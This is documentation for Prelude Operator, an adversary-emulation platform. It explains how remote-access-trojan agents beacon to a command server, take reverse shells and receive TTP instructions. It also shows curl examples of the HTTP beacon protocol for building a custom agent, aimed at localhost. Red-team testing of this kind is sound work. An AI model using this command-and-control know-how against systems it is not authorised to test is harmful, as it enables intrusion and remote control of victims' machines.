
# What is an agent

#### Remote access trojans

---

An agent, often referred to as a Remote Access Trojan, is a process running on a remote computer which can run commands while under the control of a bad actor.
Agents beacon into Operator periodically to ask for instructions to run. Each agent is
automatically grouped into a range. Agents communicate to
this application through one of several network protocols, such as TCP, UDP, or HTTP.

### What is ThirdEye

---

ThirdEye is a NodeJS agent that is built directly into Operator. When Operator starts, ThirdEye automatically launches
and beacons into your Home range with the username of the user running the desktop application. It only communicates
locally to Operator and is designed for testing TTPs out before deploying them in the wild. Check out the Home range
in the Operate section to view ThirdEye. ThirdEye does not support reverse shells.

### Download agents

---

All available agents can be found in the Editor section by clicking on the manage payloads icon. Here, you will find agents 
written in various computer languages, intended for various operating systems, and connecting to Operator over 
various network protocols. The most popular open-source agent is called Pneuma, a Golang agent which supports all 
major operating systems and 3 different protocols (TCP, UDP, HTTP). 

### Agent ranges

---

Ranges are logical groupings of agents. For example, a range can be used to cluster agents from various platforms (darwin, 
linux, windows) in order to run a cross-platform chain against all the agents. Agents can be moved between ranges using 
either command line flags or the Update Agent Configuration modal in the Operate section.

### Reverse shell

---

If you are working with a TCP-based agent you can open a reverse-shell to it by clicking the terminal icon.
This shell will give you a local terminal to the selected agent which allows you to take manual control of the host.

### Locking an agent

---

Lock an agent in order to approve or reject each instruction (TTP) before it is picked up and executed.
Look for the lock icon at the upper right-hand corner of the agent dashboard. When an agent is locked, all instructions
will enter pending state where you can approve or reject them one at a time.

### Agent facts

---

Each agent collects and manages its own collection of facts, which it will use as variables inside TTP commands.
You can interact with these facts by clicking the document icon. while inside a given agent's dashboard. Additionally,
agents can report new facts over the HTTP listening post. It requires your API key to authenticate with Operator, 
which - if you're adding this command inside a TTP - you can use the automatic #{operator.session} fact to inject your key dynamically (below). 

#### Add facts to an agent

```shell
curl -X POST #{operator.http}/facts -k -H "Authorization: #{operator.session}" -d '{
    "host":"david",
    "facts":[
        {"key": "file.T1005", "value": "/tmp/new/file"},
        {"key": "valuable.password", "value": "abc123", "scope":"range"}
    ]
}'
```
    
### Deleting an agent

---

When you delete a file-based agent, like Pneuma, the connection is stopped and the all agent data is deleted.
However, if you don't stop the agent's process on the compromised machine, the agent will just beacon back in
and create a new version of itself. To stop the process, you will need to send the agent an "exit" keyword command.
You can do this from the Editor section by using the "Stop Agent Process" procedure. Run this, then delete the
agent to completely block it.

### Translators

---

Looking to connect an agent over a non-supported protocol? We have open-sourced the concept of translators, which
are simple Python servers you can deploy anywhere to accept traffic (beacons) over one protocol and translate/proxy them 
to Operator over a supported one. You can get to know the existing translators in our [open-source](https://github.com/preludeorg/community/) 
space.

### Build your own agent

---

You can write your own agent in any language easily. Follow this simple interface to do so. Hint: if you enable 
plain-text encryption from the main Operate section (via the key icon) you can copy the below commands 
into a terminal to get a real agent online. At a minimum, you will need the following attributes: "name", "target", "location", "platform", "executors", "range", "sleep".

#### HTTP Agent 1st beacon to Operator

```shell
curl -X POST localhost:3391 -d '{
    "Name":"david",
    "Target":"127.0.0.1:3391",
    "Hostname":"whoami",
    "Location":"/tmp/here",
    "Platform":"darwin",
    "Executors":["sh"],
    "Range":"home",
    "Sleep":60,
    "Pwd":"/Users/me",
    "Executing":"",
    "Links":[]
}'
```

#### Operator responds with instructions

```shell
{
    "links":[
        {
            "ID": "c1883712-c81b-40a8-952d-a15123c034c6",
            "ttp":"85341c8c-4ecb-4579-8f53-43e3e91d7617",
            "tactic":"discovery",
            "Executor":"sh",
            "Request":"arp -a",
            "Payload":""
        }
    ]
}
```

#### HTTP Agent executes instructions and sends a new beacon

```shell
curl -X POST localhost:3391 -d '{
    "Name":"david",
    "Target":"127.0.0.1:3391",
    "Hostname":"whoami",
    "Location":"/tmp/here",
    "Platform":"darwin",
    "Executors":["sh"],
    "Range":"home",
    "Sleep":60,
    "Pwd":"/Users/me",
    "Executing":"",
    "Links":[
        {
            "ID": "c1883712-c81b-40a8-952d-a15123c034c6"
            "Executor": "sh",
            "Payload": "",
            "Request": "arp -a",
            "Response": "some response",
            "Status": 0,
            "Pid": 123
       }
    ]
}'
``` 
